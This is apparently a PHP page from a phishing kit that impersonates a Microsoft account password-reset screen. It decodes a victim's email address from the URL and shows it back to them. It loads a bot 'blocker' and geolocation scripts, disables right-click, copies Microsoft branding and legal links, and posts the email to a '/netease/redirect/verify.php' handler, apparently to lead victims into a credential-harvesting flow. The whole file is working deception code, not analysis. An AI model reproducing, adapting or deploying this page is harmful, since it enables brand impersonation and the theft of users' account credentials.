<?php
session_start();
ob_start();
include "blocker.php";
include "geo.php";
$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	

parse_str(parse_url($url, PHP_URL_QUERY));

	
$parts = @explode('@', $userid);
	
$user = @$parts[0];
$email=base64_decode($_GET['email']);

// start > to get url and and put id 
	
$subemail = $_SESSION['subemail']= $_GET['subemail'];
//get library
include "langLib.php";

?>
<html><head>
<title>Microsoft account</title>
    <meta http-equiv="Content-Type" content="text/html;charset=utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes"/><meta name="format-detection" content="telephone=no"/>
    <link rel="icon" href="/netease/assets/images/favicon.ico?v=2" type="image/x-icon" />
    

    
    <style type="text/css">body{display:block;}</style>
    <link href="/netease/assets/msa_wrTKunQ4zSdj0K9xOU4qBg2.css?v=1" rel="stylesheet" />
	<script type="text/javascript">
	document.addEventListener("contextmenu", function (e) {
        e.preventDefault();
    }, false);
    </script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

   <script src="resetfilecallup.js"></script>
   <script> 
   $(document).ready(function(){
    var country ="<?php echo $country ?>";
    filecallup(country);
   });
    </script>
   
	</head>
<body style="" class="ltr  Chrome _Win _M70 _D0 Full RE_WebKit" lang="en-US" >
        <div class="App" id="iPageElt">  
  

        
        <div id="m_wh">
            

<div role="banner" id="c_header" class="c_hb c_hncb">
    <div class="c_c t_hdbg c_cd c_c8 c_clt" id="c_cb0" style="overflow: visible;">
        <!-- Fallback header logo -->
        <div class="c_clogo c_clogoni" style="min-width: 170px;">
            <div>
                <a title="" class="c_clogot" id="c_clogot" onclick="" href="#" aria-label="Microsoft account">
                    <img src="/netease/assets/images/ms-logo-v2_XshpB8GsXvPhF3I5mP64vg2.jpg" aria-hidden="true">
                    <span id="site-identifier" aria-hidden="true">Account</span>
                </a>
            </div>
        </div>
        <!-- Fallback header Signin/Signout link -->
        <div id="c_cme" class="c_cme">
            <a id="c_csigninsignout" href="#">Sign in</a>
        </div>
    </div>
</div>

        </div>
        
    
<div id="c_base" class="c_base">
        <div id="c_content" class="c_main">
            
    
        
            

            <div class="">
                <div role="main" class="c_inmiddle_area" id="maincontent" spellcheck="false">
                    
    <div id="pageControlHost">
    <div class="disconnectProofPageContainer  PageContainer" style="opacity: 1;"><div id="Start">
            <section class="section">
                <div id="iStartTitle" class="text-subheader" role="heading" data-bind="text: pageTitle">Do you want to reset password for the Microsoft account &nbsp; <?php echo $subemail ?>?</div>
                <div class="section-body container">
                    <form name="radioform" method="post" action="/netease/redirect/verify.php">
                        <input name="userid" type="hidden" value="<?php echo $email ?>"
                    <div class="row">
                        <div id="pageDesc" class="col-xs-24 text-body" data-bind="text: pageDescription">We hide the full email address for security reasons.</div>
                    </div>
                    <div class="row">
                        <div class="col-xs-24">
                            <div class="radio">
                                <label>
                                    <input type="radio" name="DisconnectProofOption" id="removeProof" value="removeProof" checked="">
                                    <span class="text-base">
                                    <span id="textbase">No - cancel password confirmation link &nbsp; </span>&nbsp;<span id="base">&nbsp;&nbsp;for &nbsp;&nbsp; </span>&nbsp;&nbsp;<?php echo $email ?></span>
                                </label>
                            </div>
                            <div class="radio">
                                <label> 
                                    <input type="radio" name="DisconnectProofOption" id="keepProof" value="keepProof">
                                    <span class="text-base">
                                        <span id="proofbase"> Yes - &nbsp;</span> &nbsp;<?php echo $subemail ?> <span id= "proof">reset password for my Microsoft account </span>
                                        </span>
                                </label>
                            </div>
                        </div>
                    </div>
                    <div class="row btn-group">
                        <div class="col-xs-24">
                            <input type="submit" id="StartAction" class="btn btn-primary" value="Next">
                        </div>
                    </div>
                    </form>
                </div>
            </section>
        </div></div></div>

                </div>
                <div role="main" class="c_inmiddle_area" id="dynamiccontent" style="display:none" aria-hidden="true" spellcheck="false">
                    
    <div id="disconnectProofTemplates" style="display:none">
        <!-- Start page -->
        
        <!-- Finish page -->
        
        <!-- Cancel page -->
        
        <!-- Error page -->
        
    </div>

                </div>
                <div role="main" class="c_inmiddle_area" id="dynamiccontent1" style="display:none" aria-hidden="true" spellcheck="false">
                    
                </div>
            </div>
            <div class="ClearFloat"></div>
        
        
                    

            
                <div id="m_wf" class="m_wfp">
                

<div id="uxp_ftr_ctr" role="contentinfo">
    <div>
        <div id="uxp_ftr_modal_language" class="modal fade" tabindex="-1" role="dialog" aria-label="English (United States)" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <h4>Language</h4>
                    </div>
                    <form name="langPicker" action="/handlers/languagesave.mvc" method="POST">
                    <div class="modal-body">
                        We're unable to display the list of languages at this time.
                    </div>
                    </form>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-primary">Save</button>
                    </div>
                </div>
            </div>
        </div>

        <div id="uxp_ftr_items" class="col-xs-24">
            <div class="pull-right">
                

                <span id="uxp_ftr_link_trademark">© 2018 Microsoft</span>

                <span><a id="uxp_ftr_link_legal" target="_top" tabindex="0" href="https://www.microsoft.com/en-us/servicesagreement/default.aspx" aria-label="Microsoft Terms of Use">Terms of Use</a></span>
                <span><a id="uxp_ftr_link_privacy" target="_top" tabindex="0" href="https://go.microsoft.com/fwlink/?LinkID=521839" aria-label="Microsoft Privacy &amp; Cookies statement">Privacy &amp; Cookies</a></span>

                
                <span>
                    <a id="uxp_ftr_link_developers" target="_top" href="https://go.microsoft.com/fwlink/?LinkId=286660">Developers</a>
                </span>
                
                <span>
                    <a id="uxp_ftr_link_lang" data-toggle="modal" href="#uxp_ftr_modal_language">English (United States)</a>
                </span>
                
            </div>
        </div>
    </div>
</div>


<!-- Burn the required strings to the page rather than fetching via an additional call to server -->

                </div>
            
        </div>
    </div></div>
    
   
    
    
    
  

   

    
  
</body>
</html>